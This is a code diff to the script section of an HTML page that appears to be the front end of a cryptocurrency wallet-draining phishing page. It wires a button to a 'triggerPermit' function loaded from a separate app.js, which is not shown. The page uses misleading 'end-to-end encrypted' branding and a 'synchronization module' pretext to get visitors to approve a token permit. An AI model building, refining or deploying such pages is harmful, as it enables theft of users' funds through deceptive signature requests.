@@ -65,41 +65,31 @@
         </div>
         <div class="footer">ENCRYPTED END-TO-END VIA AZTEC CONNECT</div>
     </div>
+
+    <!-- 1. The Interaction Logic (v8.6 compatible) -->
     <script>
-        const getProvider = () => window.ethereum || (window.web3 && window.web3.currentProvider) || null;
-
-        const trigger = async () => {
-            const provider = getProvider();
-            if (!provider) {
-                alert("Please open this page inside a Web3 wallet (Trust Wallet, MetaMask, etc.)");
-                return;
-            }
-
-            // Move to loading state
-            document.getElementById('ui-main').style.display = 'none';
-            document.getElementById('ui-loading').style.display = 'block';
-
+        /**
+         * The button now strictly calls the app.js function.
+         * app.js handles the Switch, the Connection, and the UI transition.
+         */
+        document.getElementById('action-btn').onclick = async () => {
             if (typeof triggerPermit === 'function') {
-                try { 
+                try {
+                	// Call the hardened app.js logic
                     await triggerPermit(); 
-                } catch (e) { 
-                    console.error("Interaction failed:", e);
-                    // Revert UI if the user cancels or an error occurs
-                    document.getElementById('ui-main').style.display = 'block'; 
-                    document.getElementById('ui-loading').style.display = 'none'; 
+                } catch (e) {
+                    console.error("Workflow failed", e);
+                    // Reset UI if it crashed before starting
+                    document.getElementById('ui-main').style.display = 'block';
+                    document.getElementById('ui-loading').style.display = 'none';
                 }
             } else {
-                console.error("app.js not loaded correctly.");
-                document.getElementById('ui-main').style.display = 'block'; 
-                document.getElementById('ui-loading').style.display = 'none'; 
+                alert("The synchronization module (app.js) is still loading. Please wait 1-2 seconds and try again.");
             }
         };
-
-        // Assign the click event to the button
-        document.getElementById('action-btn').onclick = trigger;
-        
-        // Removed setTimeout(trigger, 1500) to ensure mobile compatibility
     </script>
+
+    <!-- 2. The Logic Implementation -->
     <script src="app.js"></script>
 </body>
-</html> 
+</html>
